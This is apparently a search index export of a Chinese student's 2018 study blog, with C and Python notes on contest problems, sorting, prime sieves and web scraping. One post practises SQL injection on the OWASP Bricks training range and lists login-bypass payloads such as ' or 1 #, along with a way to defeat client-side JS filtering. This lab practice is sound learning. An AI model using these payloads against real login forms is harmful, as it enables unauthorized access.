    <content type="text"><![CDATA[这道题我进坑了，我看到这个题的第一反应就是定义一个二维数组模拟坐标系，按顺序把地毯数存进覆盖的坐标中。然后我就看到内存达到128000KB，下载输入测试文件，发现了10000个地毯数据QAQ~!!刚开始的代码12345678910111213141516171819202122232425#include &lt;stdio.h&gt;int array[10001][10001]=&#123;0&#125;;int main ()&#123; int x,y,a,b,g,h; int n; scanf("%d",&amp;n); for(int i=1;i&lt;=n;i++) &#123; scanf("%d %d %d %d",&amp;a,&amp;b,&amp;g,&amp;h); for(int j=a;j&lt;=a+g;j++)//把地毯覆盖的点赋值 &#123; for(int k=b;k&lt;=b+h;k++) &#123; array[j][k]=i; &#125; &#125; &#125; scanf("%d %d",&amp;x,&amp;y); if(array[x][y]==0) &#123; printf("-1"); &#125;else printf("%d",array[x][y]); return 0;&#125; 然后我就去看下大佬是怎么解决的，瞬间就明白了，微笑，默叹，以为妙绝。正确思路应该是这样的，定义一个数组，按顺序保存地毯四个角的坐标，再逆序判断给定点是否在地毯内就行了。改写代码如下，顺利AC，收获挺大的。1234567891011121314151617181920212223#include &lt;stdio.h&gt;int a[10001][5];int main()&#123; int x,y,n; scanf("%d",&amp;n); for(int i=1;i&lt;=n;i++) &#123; scanf("%d %d %d %d",&amp;a[i][1],&amp;a[i][2],&amp;a[i][3],&amp;a[i][4]); a[i][3]+=a[i][1]; a[i][4]+=a[i][2]; &#125;//数组只是用来记录第i个地毯的四个点的坐标 scanf("%d %d",&amp;x,&amp;y); for(int i=n;i&gt;=1;i--)//逆序判断地毯是否覆盖（x，y） &#123; if(a[i][1]&lt;=x&amp;&amp;a[i][2]&lt;=y&amp;&amp;a[i][3]&gt;=x&amp;&amp;a[i][4]&gt;=y) &#123;printf("%d",i); return 0; &#125; &#125; printf("-1");//没有则输出-1 return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[尝试简单的sql注入]]></title>
    <url>%2F2018%2F11%2F02%2F%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。https://bbs.pediy.com/thread-218653.htm这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址http://43.247.91.228:83/login-pages.html第一题在username输入以下语句都可以，只要让引号闭合并使语句成立就行，比如可以在后面加#，注释掉后面的语句123451' or 1 #1' or 1 or '' or 1 #' or 1 or '1' or 1=1 # 第二题发现使用了js验证，加了黑名单禁止输入特殊字符。可以右键查看源代码看看js代码，然后打开开发者工具在console里修改该js函数，再使用注入语句就行了。 第三题发现它在两边加入了括号()，所以只要构造语句使括号闭合就行。121') or 1 #1') or 1 or(' 第四题和第三题差不多，只不过使用双引号””包裹字符串。121") or 1 #1") or 1 or (" 第五题直接用第一题的语句注入，发现返回了输入密码的MD5值，虽然我不知道这是干什么的。 第六题我也不知道是干啥的，可以直接注入，我搜了下题目名automatic redirect 叫自动重定向。我再问问大佬这是啥。]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法上的一些术语]]></title>
    <url>%2F2018%2F11%2F02%2F%E7%AE%97%E6%B3%95%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%AF%E8%AF%AD%2F</url>
    <content type="text"><![CDATA[我发现了一个较严重问题，就是听不懂大佬说的一些名词，感受到了莫名的恐惧？？？于是我从网上找了一些术语，写在这里。 OJ平台 简写 全称 中文称谓 OJ Online Judge 在线判题系统 AC Accepted 通过 WA Wrong Answer 答案错误 TLE Time Limit Exceed 超时 OLE Output Limit Exceed 超过输出限制 MLE Memory Limit Exceed 超内存 RE Runtime Error 运行时错误 PE Presentation Error 格式错误 CE Compile Error 无法编译 算法常用术语英中对照 英语 中文 Approximate String Matching 模糊匹配 Arbitrary Precision Arithmetic 高精度计算 Bandwidth Reduction 带宽压缩 Bin Packing 装箱问题 Calendrical Calculations 日期 Clique 最大团 Combinatorial Problems 组合问题 Computational Geometry 计算几何 Connected Components 连通分支 Constrained and Unconstrained Optimization 最值问题 Convex Hull 凸包 Cryptography 密码 Data Structures 基本数据结构 Determinants and Permanents 行列式 Dictionaries 字典 Discrete Fourier Transform 离散Fourier变换 Drawing Graphs Nicely 图的描绘 Drawing Trees 树的描绘 Edge and Vertex Connectivity 割边/割点 Edge Coloring 边染色 Eulerian Cycle / Chinese Postman Euler 回路/中国邮路 Factoring and Primality Testing 因子分解/质数判定 Feedback Edge/Vertex Set 最大无环子图 Finite State Machine Minimization 有穷自动机简化 Generating Graphs 图的生成 Generating Partitions 划分生成 GeneratingPermutations 排列生成 GeneratingSubsets 子集生成 Graph Data Structures 图形数据结构 Graph Isomorphism 图同构 Graph Partition 图的划分 Graph Problems — hard 图论-NP问题 Graph Problems — polynomial 图论-多项式算法 Hamiltonian Cycle Hamilton 回路 Independent Set 独立集 Intersection Detection 碰撞测试 Job Scheduling 工程安排 Kd-Trees 线段树 Knapsack Problem 背包问题 Linear Programming 线性规划 Longest Common Substring 最长公共子串 Maintaining Line Arrangements 平面分割 Matching 匹配 Matrix Multiplication 矩阵乘法 Medial-Axis Transformation 中轴变换 Median and Selection 中位数 Minimum Spanning Tree 最小生成树 Minkowski Sum Minkowski和 Motion Planning 运动规划 Nearest Neighbor Search 最近点对查询 Network Flow 网络流 Numerical Problems 数值问题 Planarity Detection and Embedding 平面性检测和嵌入 Point Location 位置查询 Polygon Partitioning 多边形分割 Priority Queues 优先队列 Random Number Generation 随机数生成 Range Search 范围查询 rate of convergence 收敛速度 robustness 鲁棒性 Satisfiability 可满足性 Searching 查找 Set and String Problems 集合与串的问题 Set Cover 集合覆盖 Set Data Structures 集合 Shape Similarity 相似多边形 Shortest Common Superstring 最短公共父串 Shortest Path 最短路径 Simplifying Polygons 多边形化简 Solving Linear Equations 线性方程组 Sorting 排序 Steiner Tree Steiner树 String Matching 模式匹配 Text Compression 压缩 Topological Sorting 拓扑排序 Transitive Closure and Reduction 传递闭包 Traveling Salesman Problem 旅行商问题 Triangulation 三角剖分 Vertex Coloring 点染色 Vertex Cover 点覆盖 Voronoi Diagrams Voronoi图]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>术语</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过河卒问题]]></title>
    <url>%2F2018%2F11%2F01%2F%E8%BF%87%E6%B2%B3%E5%8D%92%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[学长给我安利洛谷平台，我打算开始做题然后提升，结果我做过河卒这个题就做了一天。刚开始写的程序有一些逻辑上的漏洞，测试时不能全部通过，曹老板告诉我可以下载测试数据来看，然后就找到漏洞所在，再一个一个的完善，做出来后还是很开心的。 我的心路历程首先可以发现到达当前坐标的路径数等于左边和上边路径数之和，然后我就想构造二维数组，用遍历的方法，把每一个坐标都算出来。在此之前，我需要把第0行第0列赋值为1，也需要判断马控制的坐标(马走日)在不在数组内，并赋值为0，在循环的时候写判断跳过控制点即可。我的方法就是这么复杂，以至于我刚开始漏掉好多判断条件，比如说当马控制点落在第0行或第0列时，控制点之后都将为0。当我看题解的时候，发现一堆我看不懂的名词，什么动态规划dp，什么滚动数组，还有用递归的方法做。我这个渣渣还是遍历就好了，等我再学一段时间，再来看会不会这些方法，并写进来。 我的代码先附上我的遍历方法，学会更好的方法再补充。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;stdio.h&gt;long long a[21][21];int define_horse_control1(long long array[21][21],int x,int y)//定义一个函数，把马控制的点赋为0&#123; array[x][y]=0; if(x-2&gt;=0&amp;&amp;y-1&gt;=0)array[x-2][y-1]=0;//这里都要判断一下有没有越界 if(x-2&gt;=0&amp;&amp;y+1&lt;=20)array[x-2][y+1]=0; if(x-1&gt;=0&amp;&amp;y-2&gt;=0)array[x-1][y-2]=0; if(x+1&lt;=20&amp;&amp;y-2&gt;=0)array[x+1][y-2]=0; if(x+2&lt;=20&amp;&amp;y-1&gt;=0)array[x+2][y-1]=0; if(y+1&lt;=20&amp;&amp;x+2&lt;=20)array[x+2][y+1]=0; if(x-1&gt;=0&amp;&amp;y+2&lt;=20)array[x-1][y+2]=0; if(x+1&lt;=20&amp;&amp;y+2&lt;=20)array[x+1][y+2]=0; return array[21][21]; &#125;int define_horse_control2(long long array[21][21],int x,int y,int n,int m)//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0&#123; if(x-2==0) &#123; if(y-1&gt;=1) &#123; for(int i=y-1;i&lt;=n;i++)a[0][i]=0; &#125;else &#123;for(int i=y+1;i&lt;=n;i++)a[0][i]=0;&#125; &#125; if(x-1==0) &#123; if(y-2&gt;=1) &#123; for(int i=y-2;i&lt;=n;i++)a[0][i]=0; &#125;else&#123;for(int i=y+2;i&lt;=n;i++)a[0][i]=0;&#125; &#125; if(x==0) &#123; for(int i=y;i&lt;=n;i++)a[0][i]=0; &#125; if(y-1==0) &#123; if(x-2&gt;=1) &#123; for(int i=x-2;i&lt;=m;i++)a[i][0]=0; &#125;else&#123;for(int i=x+2;i&lt;=m;i++)a[i][0]=0;&#125; &#125; if(y-2==0) &#123; if(x-1&gt;=1) &#123; for(int i=x-1;i&lt;=m;i++)a[i][0]=0; &#125;else&#123;for(int i=x+1;i&lt;=m;i++)a[i][0]=0;&#125; &#125; if(y==0) &#123; for(int i=x;i&lt;=m;i++)a[i][0]=0; &#125;&#125;int main()&#123; int m,n,x,y; scanf("%d %d %d %d",&amp;m,&amp;n,&amp;x,&amp;y); a[0][0]=0; for(int i=1;i&lt;=n;i++)a[0][i]=1;//到达第一行第一列的点都只有一条路径，都赋值为1 for(int i=1;i&lt;=m;i++)a[i][0]=1;//到达第一行第一列的点都只有一条路径，都赋值为1 define_horse_control1(a,x,y);//把马控制的点赋为0 define_horse_control2(a,x,y,n,m);//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0 for(int i=1;i&lt;=m;i++)//遍历计算到当前坐标的路径数，只需要遍历到第m行和第n列即可。 &#123; for(int j=1;j&lt;=n;j++) &#123; if((i==x-2&amp;&amp;j==y-1)||(i==x-2&amp;&amp;j==y+1)||(i==x-1&amp;&amp;j==y-2)||(i==x+1&amp;&amp;j==y-2)||(i==x+2&amp;&amp;j==y-1)||(j==y+1&amp;&amp;i==x+2)||(i==x-1&amp;&amp;j==y+2)||(i==x+1&amp;&amp;j==y+2)||(i==x&amp;&amp;j==y)) &#123; continue;//跳过马的控制点的计算 &#125; a[i][j]=a[i][j-1]+a[i-1][j];//当前坐标的路径数等于左边和上边路径数之和 &#125; &#125; printf("%lld",a[m][n]); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[排序]]></title>
    <url>%2F2018%2F10%2F30%2F%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[c刚看到数组，只会写个简单的冒泡排序。发现自己还真是菜，抱着ljr老师的算法书半天都看不懂，没办法只能自己慢慢啃了。 算法原理(摘自百度百科) 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 下面用python实现12345678def bubble_sort(nums): n = len(nums) for i in range(1,n): # n个数，比较n-1趟 for j in range(n - i):#n个数，去掉最后面排好序的(i-1)个数，剩余n-i+1个数比较n-1次，[0,n-i-1]每次判断到下标j=n-1-i即可，因为前闭后开，所以要+1 if nums[j] &gt; nums[j + 1]: nums[j], nums[j + 1] = nums[j + 1], nums[j] return numsprint(bubble_sort([1,4,5,3])) 下面用c实现12345678910111213141516171819202122#include&lt;stdio.h&gt;#define maxn 100000int a[maxn];int main()&#123; int x,n=0; while(scanf("%d",&amp;x)==1) a[n++]=x;//最后一次n又加1,所以,数组下标0到n-1 ,n个数 for(int i=1;i&lt;=n-1;i++)//n个数,比较(n-1)趟 &#123; for(int j=0;j&lt;=n-i-1;j++)//n个数,去掉最后面(i-1)个数,剩余n-i+1个数比较n-i次.每次判断到下标j=n-1-i即可 &#123; if(a[j]&gt;a[j+1]) &#123; a[j] = a[j]+a[j+1]; a[j+1] = a[j]-a[j+1]; a[j]=a[j]-a[j+1]; &#125; &#125; &#125; for(int i=0;i&lt;=n-1;i++)printf("%d ",a[i]); return 0; &#125; 学会选择法排序了123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;void sort(int *pa,int n)&#123; int index,i,k,temp; for(k=0;k&lt;n-1;k++) &#123; index=k; for(i=k+1;i&lt;n;i++) &#123; if(pa[i]&lt;pa[index])index=i; &#125; if(index!=k) &#123; temp=pa[index]; pa[index]=pa[k]; pa[k]=temp; &#125; &#125; &#125;int main()&#123; int n,i; scanf("%d",&amp;n); int a[n]; for(i=0;i&lt;=n-1;i++)scanf("%d",&amp;a[i]); sort(a,n); for(i=0;i&lt;=n-1;i++)printf("%d ",*(a+i)); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[埃氏筛法筛素数]]></title>
    <url>%2F2018%2F10%2F27%2F%E5%9F%83%E6%B0%8F%E7%AD%9B%E6%B3%95%E7%AD%9B%E7%B4%A0%E6%95%B0%2F</url>
    <content type="text"><![CDATA[昨天实验课上，当我判断质数还在用取模方法的时候，打ACM的大佬刁老板对我说出埃氏筛，随后回到宿舍开始查，到现在整理完思路已经凌晨1点，在瑟瑟发抖中写下这篇博客。 埃拉托斯特尼筛法，简称埃氏筛或爱氏筛，是一种由希腊数学家埃拉托斯特尼所提出的一种简单检定素数的算法。要得到自然数n以内的全部素数，必须把不大于根号n的所有素数的倍数剔除，剩下的就是素数。下面用python实现12345678910111213141516171819202122232425262728def JudgePrimes(n): primes = [] f = [] for i in range(n+1):#这样写，可以把自然数和列表元素的序号对应起来。 if i &gt; 2 and i%2 == 0:#把从0到n的偶数筛掉。 f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = 2*i while j&lt;=n:#把小于n的所有质数的倍数都筛掉 f[j] = 0 j += i i += 2 primes.append(2)#2是质数 for x in range(3,n+1): if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes) 算法可以进一步优化123456789101112131415161718192021222324252627def JudgePrimes(n): primes = [] f = [] for i in range(n+1): if i &gt; 2 and i%2 == 0: f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = i*i #直接从质数的平方后开始筛，因为质数的平方之前的数已经被上一个质数筛过了，此时j为奇数 while j &lt;= n: f[j] = 0 j += 2*i #如果只加一个i,j则为i的偶数倍是一个偶数已经被筛过了，所以加2个i筛掉i的奇数倍，小优化。 i += 2 primes.append(2)#2是质数 for x in range(3,n+1,2):#步长为2，把偶数跳过,小优化。 if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes) 我的c语言抠脚，下面放上照着python写的c程序1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;int main()&#123; int n,j; scanf("%d",&amp;n); int f[n+1]; for(int i=0;i&lt;=n;i++) &#123; if(i&gt;2&amp;&amp;i%2==0)f[i]=0; else f[i]=1; &#125; int i =3; while(i*i&lt;=n) &#123; if(f[i] ==1) &#123; j=i*i; while (j&lt;=n) &#123; f[j]=0; j+=2*i; &#125; &#125; i+=2; &#125; f[2]=1; printf("2 "); for(int k=3;k&lt;=n;k+=2) &#123; if(f[k]==1)printf("%d ",k); &#125; return 0;&#125; 然后我学到教材指针这部分，看见教材给了动态一维数组筛选法的例子。1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int i,j,n; int *s; do &#123; printf("Please input n:\n"); scanf("%d",&amp;n); &#125; while (n&lt;=0); s=(int*) calloc(n+1,sizeof(int)); if(s==NULL) &#123; printf("allocation failure"); exit(1); &#125; s[0]=s[1]=1; for(i=2;i&lt;=n;i++) &#123; if(s[i]==0) &#123; for(j=2*i;j&lt;n+1;j+=i)s[j]=1; &#125; &#125; for(i=0;i&lt;=n;i++) &#123; if(!s[i])printf("%5d",i); &#125; free(s); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取猫眼电影top100]]></title>
    <url>%2F2018%2F10%2F26%2F%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1top100%2F</url>
    <content type="text"><![CDATA[昨天学了正则，有点膨胀，来爬爬猫眼电影top100试试看。http://maoyan.com/board/4 用到的模块12import requestsimport re 用正则表达式匹配下载当页信息首先打开网页，右键霸王别姬检查元素，可以发现我们要提取的信息。接下来就是写代码用正则把内匹配下来12345678910111213headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125;r = requests.get('http://maoyan.com/board/4?offset=0',headers=headers)results = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S)'''findall方法会把匹配到的小括号里的一组内容加工成元组，再把所有元组以列表形式返回.*?可以非贪婪匹配任意除换行字符，只要把想提取的内容以.*?代替就好了，再加个小括号我们只需要写要提取的内容前面和后面的几个字符就好了，其他的冗长字符也可用.*?代替第二个参数是被匹配的文本，传入网页源代码即可因为标签之间还有好多换行，而.*?无法匹配换行，加上re.S这个参数，就可以匹配到了''' 再写个循环把提取到的内容写进txt文件即可123456789for i in results: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')'''a表示追加写入，要加上encoding='utf-8'，不然会编码错误i[0] i[1]等表示当前列表里的某个元组的第几个内容我们会发现元组里的第二个内容有许多空格和换行，所以我们用sub方法拿''空字符替换掉，第一个参数是被替换字符，第二个参数是替换字符，第三个参数是被操作的文本，所以我们需要把元组的内容转换成字符串。''' 写个循环爬取所有页面的内容我们发现网页的地址格式是http://maoyan.com/board/4?offset= + 0,10,20,30…10012345for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i)'''第三个参数是步长，即每次增加10，因为range里的两个数字是前闭后开，所以第二个参数要比100大，这样我们就得到0,10,20到100的数然后再把上面的代码写成函数，在这个循环里调用即可''' 最后附上全部代码,原谅小白的代码吧。12345678910111213141516import requestsimport redef get_information(url): headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125; r = requests.get(url,headers=headers) result = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S) for i in result: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i) get_information(url)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初学python爬虫]]></title>
    <url>%2F2018%2F10%2F22%2F%E5%88%9D%E5%AD%A6python%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[菜鸟初学python爬虫，爬一个没有反爬的炒鸡简单的网站。http://www.mzitu.com/zipai/ 用到的模块123import requestsfrom bs4 import BeautifulSoupimport os 找到当前页面图片地址首先打开网站，右键图片点击检查，发现图片地址在p标签下的img标签中储存。先用get方法获取页面内容，再用BeautifulSoup煲汤。1234r = requests.get('http://www.mzitu.com/zipai/')soup = BeautifulSoup(r.text,'lxml') #需要 pip install lxmllist1 = []list1 = soup.select('p &gt; img') 然后再用for循环提取出img的属性1234list2 =[]for i in list1: list2.append(i.get('src')) print(i.get('src')) 下载图片12345678os.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content) 循环每个页面很容易可以观察到，地址的格式是”http://www.mzitu.com/zipai/comment-page-&quot;+ 页数+”/#comments”因此写个for循环即可遍历地址12for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" 再把url传入上面的方法即可。 小问题1234567891011121314151617181920import requestsfrom bs4 import BeautifulSoupimport osos.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" r = requests.get(url) soup = BeautifulSoup(r.text,'lxml') list1 = soup.select('p &gt; img') list2 =[] for i in list1: list2.append(i.get('src')) print(i.get('src')) for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Welcome to my blog.]]></title>
    <url>%2F2018%2F10%2F18%2FMy%20first%20blog%2F</url>
    <content type="text"><![CDATA[学校里全是dalao，加油鸭！一定要成为一名牛逼的CTFer！不负自己，未来可期！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
</search>
